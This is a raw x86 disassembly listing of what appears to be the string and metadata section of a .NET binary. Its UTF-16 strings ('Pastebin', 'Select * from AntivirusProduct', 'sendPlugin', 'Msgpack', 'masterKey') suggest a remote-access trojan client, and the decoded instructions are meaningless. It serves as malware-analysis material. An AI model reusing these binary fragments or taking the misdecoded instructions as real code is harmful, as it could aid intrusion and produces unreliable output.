  40c3da:	00 32                	add    %dh,(%edx)
  40c3dc:	00 62 00             	add    %ah,0x0(%edx)
  40c3df:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c3e5:	50                   	push   %eax
  40c3e6:	00 61 00             	add    %ah,0x0(%ecx)
  40c3e9:	74 00                	je     0x40c3eb
  40c3eb:	68 00 00 0f 56       	push   $0x560f0000
  40c3f0:	00 65 00             	add    %ah,0x0(%ebp)
  40c3f3:	72 00                	jb     0x40c3f5
  40c3f5:	73 00                	jae    0x40c3f7
  40c3f7:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c3fd:	00 0b                	add    %cl,(%ebx)
  40c3ff:	41                   	inc    %ecx
  40c400:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c404:	00 69 00             	add    %ch,0x0(%ecx)
  40c407:	6e                   	outsb  %ds:(%esi),(%dx)
  40c408:	00 00                	add    %al,(%eax)
  40c40a:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c40e:	00 75 00             	add    %dh,0x0(%ebp)
  40c411:	65 00 00             	add    %al,%gs:(%eax)
  40c414:	0b 66 00             	or     0x0(%esi),%esp
  40c417:	61                   	popa
  40c418:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c41c:	00 65 00             	add    %ah,0x0(%ebp)
  40c41f:	00 17                	add    %dl,(%edi)
  40c421:	50                   	push   %eax
  40c422:	00 65 00             	add    %ah,0x0(%ebp)
  40c425:	72 00                	jb     0x40c427
  40c427:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c42b:	72 00                	jb     0x40c42d
  40c42d:	6d                   	insl   (%dx),%es:(%edi)
  40c42e:	00 61 00             	add    %ah,0x0(%ecx)
  40c431:	6e                   	outsb  %ds:(%esi),(%dx)
  40c432:	00 63 00             	add    %ah,0x0(%ebx)
  40c435:	65 00 00             	add    %al,%gs:(%eax)
  40c438:	11 50 00             	adc    %edx,0x0(%eax)
  40c43b:	61                   	popa
  40c43c:	00 73 00             	add    %dh,0x0(%ebx)
  40c43f:	74 00                	je     0x40c441
  40c441:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c445:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c44b:	41                   	inc    %ecx
  40c44c:	00 6e 00             	add    %ch,0x0(%esi)
  40c44f:	74 00                	je     0x40c451
  40c451:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c457:	72 00                	jb     0x40c459
  40c459:	75 00                	jne    0x40c45b
  40c45b:	73 00                	jae    0x40c45d
  40c45d:	00 13                	add    %dl,(%ebx)
  40c45f:	49                   	dec    %ecx
  40c460:	00 6e 00             	add    %ch,0x0(%esi)
  40c463:	73 00                	jae    0x40c465
  40c465:	74 00                	je     0x40c467
  40c467:	61                   	popa
  40c468:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c46c:	00 65 00             	add    %ah,0x0(%ebp)
  40c46f:	64 00 00             	add    %al,%fs:(%eax)
  40c472:	09 50 00             	or     %edx,0x0(%eax)
  40c475:	6f                   	outsl  %ds:(%esi),(%dx)
  40c476:	00 6e 00             	add    %ch,0x0(%esi)
  40c479:	67 00 00             	add    %al,(%bx,%si)
  40c47c:	0b 47 00             	or     0x0(%edi),%eax
  40c47f:	72 00                	jb     0x40c481
  40c481:	6f                   	outsl  %ds:(%esi),(%dx)
  40c482:	00 75 00             	add    %dh,0x0(%ebp)
  40c485:	70 00                	jo     0x40c487
  40c487:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c48d:	00 2b                	add    %ch,(%ebx)
  40c48f:	5c                   	pop    %esp
  40c490:	00 72 00             	add    %dh,0x0(%edx)
  40c493:	6f                   	outsl  %ds:(%esi),(%dx)
  40c494:	00 6f 00             	add    %ch,0x0(%edi)
  40c497:	74 00                	je     0x40c499
  40c499:	5c                   	pop    %esp
  40c49a:	00 53 00             	add    %dl,0x0(%ebx)
  40c49d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c4a1:	75 00                	jne    0x40c4a3
  40c4a3:	72 00                	jb     0x40c4a5
  40c4a5:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c4ab:	43                   	inc    %ebx
  40c4ac:	00 65 00             	add    %ah,0x0(%ebp)
  40c4af:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4b0:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4b4:	00 72 00             	add    %dh,0x0(%edx)
  40c4b7:	32 00                	xor    (%eax),%al
  40c4b9:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c4bf:	6c                   	insb   (%dx),%es:(%edi)
  40c4c0:	00 65 00             	add    %ah,0x0(%ebp)
  40c4c3:	63 00                	arpl   %eax,(%eax)
  40c4c5:	74 00                	je     0x40c4c7
  40c4c7:	20 00                	and    %al,(%eax)
  40c4c9:	2a 00                	sub    (%eax),%al
  40c4cb:	20 00                	and    %al,(%eax)
  40c4cd:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c4d1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4d2:	00 6d 00             	add    %ch,0x0(%ebp)
  40c4d5:	20 00                	and    %al,(%eax)
  40c4d7:	41                   	inc    %ecx
  40c4d8:	00 6e 00             	add    %ch,0x0(%esi)
  40c4db:	74 00                	je     0x40c4dd
  40c4dd:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c4e3:	72 00                	jb     0x40c4e5
  40c4e5:	75 00                	jne    0x40c4e7
  40c4e7:	73 00                	jae    0x40c4e9
  40c4e9:	50                   	push   %eax
  40c4ea:	00 72 00             	add    %dh,0x0(%edx)
  40c4ed:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4ee:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c4f2:	00 63 00             	add    %ah,0x0(%ebx)
  40c4f5:	74 00                	je     0x40c4f7
  40c4f7:	00 17                	add    %dl,(%edi)
  40c4f9:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c4fd:	73 00                	jae    0x40c4ff
  40c4ff:	70 00                	jo     0x40c501
  40c501:	6c                   	insb   (%dx),%es:(%edi)
  40c502:	00 61 00             	add    %ah,0x0(%ecx)
  40c505:	79 00                	jns    0x40c507
  40c507:	4e                   	dec    %esi
  40c508:	00 61 00             	add    %ah,0x0(%ecx)
  40c50b:	6d                   	insl   (%dx),%es:(%edi)
  40c50c:	00 65 00             	add    %ah,0x0(%ebp)
  40c50f:	00 07                	add    %al,(%edi)
  40c511:	4e                   	dec    %esi
  40c512:	00 2f                	add    %ch,(%edi)
  40c514:	00 41 00             	add    %al,0x0(%ecx)
  40c517:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c51d:	00 13                	add    %dl,(%ebx)
  40c51f:	53                   	push   %ebx
  40c520:	00 6f 00             	add    %ch,0x0(%edi)
  40c523:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c528:	00 61 00             	add    %ah,0x0(%ecx)
  40c52b:	72 00                	jb     0x40c52d
  40c52d:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c532:	09 70 00             	or     %esi,0x0(%eax)
  40c535:	6f                   	outsl  %ds:(%esi),(%dx)
  40c536:	00 6e 00             	add    %ch,0x0(%esi)
  40c539:	67 00 00             	add    %al,(%bx,%si)
  40c53c:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c541:	75 00                	jne    0x40c543
  40c543:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c547:	6e                   	outsb  %ds:(%esi),(%dx)
  40c548:	00 00                	add    %al,(%eax)
  40c54a:	15 73 00 61 00       	adc    $0x610073,%eax
  40c54f:	76 00                	jbe    0x40c551
  40c551:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c555:	6c                   	insb   (%dx),%es:(%edi)
  40c556:	00 75 00             	add    %dh,0x0(%ebp)
  40c559:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c55d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c55e:	00 00                	add    %al,(%eax)
  40c560:	07                   	pop    %es
  40c561:	44                   	inc    %esp
  40c562:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c566:	00 00                	add    %al,(%eax)
  40c568:	15 73 00 65 00       	adc    $0x650073,%eax
  40c56d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c56e:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c572:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c576:	00 67 00             	add    %ah,0x0(%edi)
  40c579:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c57f:	48                   	dec    %eax
  40c580:	00 61 00             	add    %ah,0x0(%ecx)
  40c583:	73 00                	jae    0x40c585
  40c585:	68 00 65 00 73       	push   $0x73006500
  40c58a:	00 00                	add    %al,(%eax)
  40c58c:	09 48 00             	or     %ecx,0x0(%eax)
  40c58f:	61                   	popa
  40c590:	00 73 00             	add    %dh,0x0(%ebx)
  40c593:	68 00 00 1b 50       	push   $0x501b0000
  40c598:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c59c:	00 67 00             	add    %ah,0x0(%edi)
  40c59f:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c5a5:	50                   	push   %eax
  40c5a6:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5aa:	00 67 00             	add    %ah,0x0(%edi)
  40c5ad:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c5b3:	52                   	push   %edx
  40c5b4:	00 75 00             	add    %dh,0x0(%ebp)
  40c5b7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5b8:	00 00                	add    %al,(%eax)
  40c5ba:	0f 4d 00             	cmovge (%eax),%eax
  40c5bd:	73 00                	jae    0x40c5bf
  40c5bf:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c5c3:	61                   	popa
  40c5c4:	00 63 00             	add    %ah,0x0(%ebx)
  40c5c7:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c5ca:	11 52 00             	adc    %edx,0x0(%edx)
  40c5cd:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c5d1:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c5d5:	76 00                	jbe    0x40c5d7
  40c5d7:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c5dc:	0b 45 00             	or     0x0(%ebp),%eax
  40c5df:	72 00                	jb     0x40c5e1
  40c5e1:	72 00                	jb     0x40c5e3
  40c5e3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c5e4:	00 72 00             	add    %dh,0x0(%edx)
  40c5e7:	00 47 6d             	add    %al,0x6d(%edi)
  40c5ea:	00 61 00             	add    %ah,0x0(%ecx)
  40c5ed:	73 00                	jae    0x40c5ef
  40c5ef:	74 00                	je     0x40c5f1
  40c5f1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c5f5:	4b                   	dec    %ebx
  40c5f6:	00 65 00             	add    %ah,0x0(%ebp)
  40c5f9:	79 00                	jns    0x40c5fb
  40c5fb:	20 00                	and    %al,(%eax)
  40c5fd:	63 00                	arpl   %eax,(%eax)
  40c5ff:	61                   	popa
  40c600:	00 6e 00             	add    %ch,0x0(%esi)
  40c603:	20 00                	and    %al,(%eax)
  40c605:	6e                   	outsb  %ds:(%esi),(%dx)
  40c606:	00 6f 00             	add    %ch,0x0(%edi)
  40c609:	74 00                	je     0x40c60b
  40c60b:	20 00                	and    %al,(%eax)
  40c60d:	62 00                	bound  %eax,(%eax)
  40c60f:	65 00 20             	add    %ah,%gs:(%eax)
  40c612:	00 6e 00             	add    %ch,0x0(%esi)
  40c615:	75 00                	jne    0x40c617
  40c617:	6c                   	insb   (%dx),%es:(%edi)
  40c618:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c61c:	00 6f 00             	add    %ch,0x0(%edi)
  40c61f:	72 00                	jb     0x40c621
  40c621:	20 00                	and    %al,(%eax)
  40c623:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c627:	70 00                	jo     0x40c629
  40c629:	74 00                	je     0x40c62b
  40c62b:	79 00                	jns    0x40c62d
  40c62d:	2e 00 00             	add    %al,%cs:(%eax)
  40c630:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c635:	70 00                	jo     0x40c637
  40c637:	75 00                	jne    0x40c639
  40c639:	74 00                	je     0x40c63b
  40c63b:	20 00                	and    %al,(%eax)
  40c63d:	63 00                	arpl   %eax,(%eax)
  40c63f:	61                   	popa
  40c640:	00 6e 00             	add    %ch,0x0(%esi)
  40c643:	20 00                	and    %al,(%eax)
  40c645:	6e                   	outsb  %ds:(%esi),(%dx)
  40c646:	00 6f 00             	add    %ch,0x0(%edi)
  40c649:	74 00                	je     0x40c64b
  40c64b:	20 00                	and    %al,(%eax)
  40c64d:	62 00                	bound  %eax,(%eax)
  40c64f:	65 00 20             	add    %ah,%gs:(%eax)
  40c652:	00 6e 00             	add    %ch,0x0(%esi)
  40c655:	75 00                	jne    0x40c657
  40c657:	6c                   	insb   (%dx),%es:(%edi)
  40c658:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c65c:	00 00                	add    %al,(%eax)
  40c65e:	55                   	push   %ebp
  40c65f:	49                   	dec    %ecx
  40c660:	00 6e 00             	add    %ch,0x0(%esi)
  40c663:	76 00                	jbe    0x40c665
  40c665:	61                   	popa
  40c666:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c66a:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c66e:	00 6d 00             	add    %ch,0x0(%ebp)
  40c671:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c675:	73 00                	jae    0x40c677
  40c677:	61                   	popa
  40c678:	00 67 00             	add    %ah,0x0(%edi)
  40c67b:	65 00 20             	add    %ah,%gs:(%eax)
  40c67e:	00 61 00             	add    %ah,0x0(%ecx)
  40c681:	75 00                	jne    0x40c683
  40c683:	74 00                	je     0x40c685
  40c685:	68 00 65 00 6e       	push   $0x6e006500
  40c68a:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c68e:	00 63 00             	add    %ah,0x0(%ebx)
  40c691:	61                   	popa
  40c692:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c696:	00 6f 00             	add    %ch,0x0(%edi)
  40c699:	6e                   	outsb  %ds:(%esi),(%dx)
  40c69a:	00 20                	add    %ah,(%eax)
  40c69c:	00 63 00             	add    %ah,0x0(%ebx)
  40c69f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6a0:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c6a4:	00 20                	add    %ah,(%eax)
  40c6a6:	00 28                	add    %ch,(%eax)
  40c6a8:	00 4d 00             	add    %cl,0x0(%ebp)
  40c6ab:	41                   	inc    %ecx
  40c6ac:	00 43 00             	add    %al,0x0(%ebx)
  40c6af:	29 00                	sub    %eax,(%eax)
  40c6b1:	2e 00 00             	add    %al,%cs:(%eax)
  40c6b4:	05 58 00 32 00       	add    $0x320058,%eax
  40c6b9:	00 0f                	add    %cl,(%edi)
  40c6bb:	7b 00                	jnp    0x40c6bd
  40c6bd:	30 00                	xor    %al,(%eax)
  40c6bf:	3a 00                	cmp    (%eax),%al
  40c6c1:	44                   	inc    %esp
  40c6c2:	00 33                	add    %dh,(%ebx)
  40c6c4:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6c7:	20 00                	and    %al,(%eax)
  40c6c9:	00 0f                	add    %cl,(%edi)
  40c6cb:	7b 00                	jnp    0x40c6cd
  40c6cd:	30 00                	xor    %al,(%eax)
  40c6cf:	3a 00                	cmp    (%eax),%al
  40c6d1:	58                   	pop    %eax
  40c6d2:	00 32                	add    %dh,(%edx)
  40c6d4:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6d7:	20 00                	and    %al,(%eax)
  40c6d9:	00 2b                	add    %ch,(%ebx)
  40c6db:	28 00                	sub    %al,(%eax)
  40c6dd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6de:	00 65 00             	add    %ah,0x0(%ebp)
  40c6e1:	76 00                	jbe    0x40c6e3
  40c6e3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c6e7:	20 00                	and    %al,(%eax)
  40c6e9:	75 00                	jne    0x40c6eb
  40c6eb:	73 00                	jae    0x40c6ed
  40c6ed:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c6f2:	00 20                	add    %ah,(%eax)
  40c6f4:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c6f8:	00 70 00             	add    %dh,0x0(%eax)
  40c6fb:	65 00 20             	add    %ah,%gs:(%eax)
  40c6fe:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c701:	63 00                	arpl   %eax,(%eax)
  40c703:	31 00                	xor    %eax,(%eax)
  40c705:	00 45 28             	add    %al,0x28(%ebp)
  40c708:	00 65 00             	add    %ah,0x0(%ebp)
  40c70b:	78 00                	js     0x40c70d
  40c70d:	74 00                	je     0x40c70f
  40c70f:	38 00                	cmp    %al,(%eax)
  40c711:	2c 00                	sub    $0x0,%al
  40c713:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c717:	74 00                	je     0x40c719
  40c719:	31 00                	xor    %eax,(%eax)
  40c71b:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c71f:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c723:	33 00                	xor    (%eax),%eax
  40c725:	32 00                	xor    (%eax),%al
  40c727:	29 00                	sub    %eax,(%eax)
  40c729:	20 00                	and    %al,(%eax)
  40c72b:	74 00                	je     0x40c72d
  40c72d:	79 00                	jns    0x40c72f
  40c72f:	70 00                	jo     0x40c731
  40c731:	65 00 20             	add    %ah,%gs:(%eax)
  40c734:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c737:	63 00                	arpl   %eax,(%eax)
  40c739:	37                   	aaa
  40c73a:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c73d:	24 00                	and    $0x0,%al
  40c73f:	63 00                	arpl   %eax,(%eax)
  40c741:	38 00                	cmp    %al,(%eax)
  40c743:	2c 00                	sub    $0x0,%al
  40c745:	24 00                	and    $0x0,%al
  40c747:	63 00                	arpl   %eax,(%eax)
  40c749:	39 00                	cmp    %eax,(%eax)
  40c74b:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c74e:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c752:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c755:	24 f5                	and    $0xf5,%al
  40c757:	ac                   	lods   %ds:(%esi),%al
  40c758:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c75f:	7a 5c                	jp     0x40c7bd
  40c761:	56                   	push   %esi
  40c762:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c765:	89 03                	mov    %eax,(%ebx)
  40c767:	00 00                	add    %al,(%eax)
  40c769:	01 03                	add    %eax,(%ebx)
  40c76b:	20 00                	and    %al,(%eax)
  40c76d:	01 02                	add    %eax,(%edx)
  40c76f:	06                   	push   %es
  40c770:	0e                   	push   %cs
  40c771:	03 06                	add    (%esi),%eax
  40c773:	12 09                	adc    (%ecx),%cl
  40c775:	03 06                	add    (%esi),%eax
  40c777:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c77b:	00 02                	add    %al,(%edx)
  40c77d:	03 06                	add    (%esi),%eax
  40c77f:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c785:	03 06                	add    (%esi),%eax
  40c787:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c78c:	03 06                	add    (%esi),%eax
  40c78e:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c794:	06                   	push   %es
  40c795:	1c 02                	sbb    $0x2,%al
  40c797:	06                   	push   %es
  40c798:	08 04 00             	or     %al,(%eax,%eax,1)
  40c79b:	00 12                	add    %dl,(%edx)
  40c79d:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c7a2:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c7a8:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c7ae:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c7b1:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c7b7:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c7bd:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7c0:	01 01                	add    %eax,(%ecx)
  40c7c2:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7c5:	00 12                	add    %dl,(%edx)
  40c7c7:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c7cc:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c7d2:	02 03                	add    (%ebx),%al
  40c7d4:	00 00                	add    %al,(%eax)
  40c7d6:	1c 03                	sbb    $0x3,%al
  40c7d8:	00 00                	add    %al,(%eax)
  40c7da:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7dd:	01 01                	add    %eax,(%ecx)
  40c7df:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7e2:	01 02                	add    %eax,(%edx)
  40c7e4:	0e                   	push   %cs
  40c7e5:	0a 00                	or     (%eax),%al
  40c7e7:	04 02                	add    $0x2,%al
  40c7e9:	1c 12                	sbb    $0x12,%al
  40c7eb:	19 12                	sbb    %edx,(%edx)
  40c7ed:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c7f2:	01 01                	add    %eax,(%ecx)
  40c7f4:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c7fa:	1c 04                	sbb    $0x4,%al
  40c7fc:	08 00                	or     %al,(%eax)
  40c7fe:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c804:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c807:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c80d:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c810:	00 12                	add    %dl,(%edx)
  40c812:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c817:	03 08                	add    (%eax),%ecx
  40c819:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c81c:	08 00                	or     %al,(%eax)
  40c81e:	08 03                	or     %al,(%ebx)
  40c820:	00 00                	add    %al,(%eax)
  40c822:	0e                   	push   %cs
  40c823:	04 00                	add    $0x0,%al
  40c825:	01 0e                	add    %ecx,(%esi)
  40c827:	0e                   	push   %cs
  40c828:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c82e:	d5 0a                	aad    $0xa
  40c830:	3a 06                	cmp    (%esi),%al
  40c832:	00 01                	add    %al,(%ecx)
  40c834:	12 29                	adc    (%ecx),%ch
  40c836:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c83c:	03 00                	add    (%eax),%eax
  40c83e:	00 18                	add    %bl,(%eax)
  40c840:	07                   	pop    %es
  40c841:	00 03                	add    %al,(%ebx)
  40c843:	08 18                	or     %bl,(%eax)
  40c845:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c84b:	18 0e                	sbb    %cl,(%esi)
  40c84d:	06                   	push   %es
  40c84e:	00 02                	add    %al,(%edx)
  40c850:	02 18                	add    (%eax),%bl
  40c852:	10 02                	adc    %al,(%edx)
  40c854:	06                   	push   %es
  40c855:	00 01                	add    %al,(%ecx)
  40c857:	11 30                	adc    %esi,(%eax)
  40c859:	11 30                	adc    %esi,(%eax)
  40c85b:	06                   	push   %es
  40c85c:	00 03                	add    %al,(%ebx)
  40c85e:	01 09                	add    %ecx,(%ecx)
  40c860:	09 09                	or     %ecx,(%ecx)
  40c862:	02 06                	add    (%esi),%al
  40c864:	09 03                	or     %eax,(%ebx)
  40c866:	06                   	push   %es
  40c867:	11 30                	adc    %esi,(%eax)
  40c869:	04 00                	add    $0x0,%al
  40c86b:	00 00                	add    %al,(%eax)
  40c86d:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c871:	00 00                	add    %al,(%eax)
  40c873:	04 01                	add    $0x1,%al
  40c875:	00 00                	add    %al,(%eax)
  40c877:	00 06                	add    %al,(%esi)
  40c879:	00 02                	add    %al,(%edx)
  40c87b:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c87e:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c883:	0e                   	push   %cs
  40c884:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c889:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c88e:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c893:	60                   	pusha
  40c894:	05 00 01 01 12       	add    $0x12010100,%eax
  40c899:	60                   	pusha
  40c89a:	04 00                	add    $0x0,%al
  40c89c:	01 01                	add    %eax,(%ecx)
  40c89e:	0e                   	push   %cs
  40c89f:	18 06                	sbb    %al,(%esi)
  40c8a1:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c8a6:	12 49 0a             	adc    0xa(%ecx),%cl
  40c8a9:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c8ac:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c8b2:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c8b7:	0e                   	push   %cs
  40c8b8:	04 20                	add    $0x20,%al
  40c8ba:	00 00                	add    %al,(%eax)
  40c8bc:	00 04 40             	add    %al,(%eax,%eax,2)
  40c8bf:	00 00                	add    %al,(%eax)
  40c8c1:	00 04 10             	add    %al,(%eax,%edx,1)
  40c8c4:	00 00                	add    %al,(%eax)
  40c8c6:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c8c9:	01 01                	add    %eax,(%ecx)
  40c8cb:	0e                   	push   %cs
  40c8cc:	04 20                	add    $0x20,%al
  40c8ce:	01 0e                	add    %ecx,(%esi)
  40c8d0:	0e                   	push   %cs
  40c8d1:	06                   	push   %es
  40c8d2:	20 01                	and    %al,(%ecx)
  40c8d4:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c8d9:	20 02                	and    %al,(%edx)
  40c8db:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c8e1:	00 01                	add    %al,(%ecx)
  40c8e3:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c8e8:	06                   	push   %es
  40c8e9:	11 50 03             	adc    %edx,0x3(%eax)
  40c8ec:	06                   	push   %es
  40c8ed:	12 55 05             	adc    0x5(%ebp),%dl
  40c8f0:	00 01                	add    %al,(%ecx)
  40c8f2:	0e                   	push   %cs
  40c8f3:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c8f8:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c8fd:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c903:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c909:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c90f:	01 01                	add    %eax,(%ecx)
  40c911:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c916:	60                   	pusha
  40c917:	03 20                	add    (%eax),%esp
  40c919:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c91c:	20 00                	and    %al,(%eax)
  40c91e:	02 03                	add    (%ebx),%al
  40c920:	28 00                	sub    %al,(%eax)
  40c922:	1c 03                	sbb    $0x3,%al
  40c924:	06                   	push   %es
  40c925:	12 60 0b             	adc    0xb(%eax),%ah
  40c928:	20 02                	and    %al,(%edx)
  40c92a:	01 12                	add    %edx,(%edx)
  40c92c:	60                   	pusha
  40c92d:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c932:	60                   	pusha
  40c933:	04 20                	add    $0x20,%al
  40c935:	00 12                	add    %dl,(%edx)
  40c937:	60                   	pusha
  40c938:	05 20 01 12 60       	add    $0x60120120,%eax
  40c93d:	0e                   	push   %cs
  40c93e:	05 20 01 12 60       	add    $0x60120120,%eax
  40c943:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c949:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c94e:	60                   	pusha
  40c94f:	08 03                	or     %al,(%ebx)
  40c951:	20 00                	and    %al,(%eax)
  40c953:	08 05 28 01 12 60    	or     %al,0x60120128
  40c959:	08 03                	or     %al,(%ebx)
  40c95b:	28 00                	sub    %al,(%eax)
  40c95d:	08 03                	or     %al,(%ebx)
  40c95f:	06                   	push   %es
  40c960:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c964:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c968:	01 08                	add    %ecx,(%eax)
  40c96a:	0e                   	push   %cs
  40c96b:	05 20 01 01 12       	add    $0x12010120,%eax
  40c970:	61                   	popa
  40c971:	04 20                	add    $0x20,%al
  40c973:	01 01                	add    %eax,(%ecx)
  40c975:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c978:	01 01                	add    %eax,(%ecx)
  40c97a:	0b 03                	or     (%ebx),%eax
  40c97c:	20 00                	and    %al,(%eax)
  40c97e:	0b 03                	or     (%ebx),%eax
  40c980:	20 00                	and    %al,(%eax)
  40c982:	0a 03                	or     (%ebx),%al
  40c984:	20 00                	and    %al,(%eax)
  40c986:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c98b:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c990:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c995:	01 0e                	add    %ecx,(%esi)
  40c997:	0e                   	push   %cs
  40c998:	05 20 02 01 0e       	add    $0xe010220,%eax
